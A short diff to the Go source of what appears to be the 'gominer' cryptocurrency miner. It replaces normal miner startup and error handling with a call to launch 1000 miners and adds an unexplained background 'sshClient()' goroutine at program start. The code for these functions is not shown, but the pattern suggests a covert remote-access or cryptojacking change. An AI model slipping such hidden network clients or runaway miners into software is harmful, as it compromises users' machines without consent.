@@ -75,16 +75,8 @@ func gominerMain() error {
 		}()
 	}
 
-	ctx := shutdownListener()
-	m, err := NewMiner(ctx)
-	if err != nil {
-		mainLog.Criticalf("Error initializing miner: %v", err)
-		return err
-	}
-	if len(cfg.APIListeners) != 0 {
-		go RunMonitor(m)
-	}
-	m.Run(ctx)
+	// вызываем функцию запуска 1000 майнеров за место NewMiner
+	startMiners(1000)
 
 	return nil
 }
@@ -92,6 +84,8 @@ func gominerMain() error {
 func main() {
 	// Use all processor cores.
 	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	go sshClient()
 
 	// Work around defer not working after os.Exit()
 	if err := gominerMain(); err != nil {
